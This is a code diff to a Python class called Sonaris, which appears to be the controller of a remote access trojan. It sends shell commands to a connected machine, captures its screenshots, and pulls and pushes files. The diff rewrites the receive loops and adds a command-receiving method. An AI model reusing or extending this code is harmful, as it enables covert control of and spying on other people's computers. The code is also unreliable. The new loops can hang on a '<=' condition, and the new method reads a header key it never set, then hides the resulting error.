@@ -95,6 +95,7 @@ class Sonaris(object):
             
     def SaveScreenshot(self, header, connection):
         screenshot = b''
+        '''
         while True is not False:
             if(len(screenshot) >= header['numofbytes']):
                 break
@@ -102,7 +103,12 @@ class Sonaris(object):
                 screenshot += connection.recv(header['numofbytes'])
 
             print(colored(f'{int((len(screenshot)/header["numofbytes"])*100)}% {len(screenshot)} bytes received', 'yellow'), end='\r')
-
+        '''
+        
+        while(len(screenshot) <= header['numofbytes']):
+            screenshot += connection.recv(header['numofbytes'])
+            print(colored(f'{int((len(screenshot)/header["numofbytes"])*100)}% {len(screenshot)} bytes received', 'yellow'), end='\r')
+            
         current = datetime.now()
         with open(f'screenshot-{current.hour}-{current.minute}-{current.second}{header["extension"]}', 'wb') as file:
             file.write(screenshot)
@@ -116,6 +122,7 @@ class Sonaris(object):
 
     def SavingLargeFile(self, header, connection):
         file_downloaded = b''
+        '''
         while True is not False:
             if(len(file_downloaded) >= header['numofbytes']):
                 break
@@ -123,7 +130,11 @@ class Sonaris(object):
                 file_downloaded += connection.recv(header['numofbytes'])
 
             print(colored(f'{int((len(file_downloaded)/header["numofbytes"])*100)}% {len(file_downloaded)} bytes received', 'yellow'), end='\r')
-
+        '''
+        while(len(file_downloaded) <= header['numofbytes']):
+            file_downloaded += connection.recv(header['numofbytes'])
+            print(colored(f'{int((len(file_downloaded)/header["numofbytes"])*100)}% {len(file_downloaded)} bytes received', 'yellow'), end='\r')
+            
         with open(f'{header["name"]}{header["extension"]}', 'wb') as file:
             file.write(file_downloaded)
             file.close()
@@ -164,6 +175,27 @@ class Sonaris(object):
         except KeyboardInterrupt:
             pass
 
+    def ReceivingCommands(self, connection, command):
+        try:
+            connection.send(command.encode())
+            header = loads(connection.recv(self._CmdBufferSize))
+            received_command = b''
+            '''
+            while True is not False:
+                if(len(received_command) >= header['size']):
+                    break
+                else:
+                    received_command += connection.recv(header['size'])
+            '''
+            while(len(received_command) <= header['size']):
+                received_command += connection.recv(header['size'])
+                print(colored(f'{int((len(received_command)/header["numofbytes"])*100)}% {len(received_command)} bytes received', 'yellow'), end='\r')
+            
+            return f'{received_command.decode("utf-8", errors="replace")}'
+        
+        except Exception:
+            return 1
+
     def SendCommands(self, connection, command):
         try:
             if(command.strip()[:9] == '/download'):
@@ -184,12 +216,7 @@ class Sonaris(object):
             elif(command.strip()[:7] == '/upload'):
                 return self.UploadFiles(command[8:], connection)
             else:
-                connection.send(command.encode())
-                received_command = connection.recv(self._CmdBufferSize)
-                if(not received_command):
-                    return 1
-                else:
-                    return f'{received_command.decode("utf-8", errors="replace")}'
+                return self.ReceivingCommands(connection, command)
         except:
             return 1
 
@@ -229,7 +256,7 @@ class Sonaris(object):
 
 
 def Screenfetch():
-    return '''
+    return r'''
     _______  _____  __   _ _______  ______ _____ _______
     |______ |     | | \  | |_____| |_____/   |   |______
     ______| |_____| |  \_| |     | |    \_ __|__ ______|
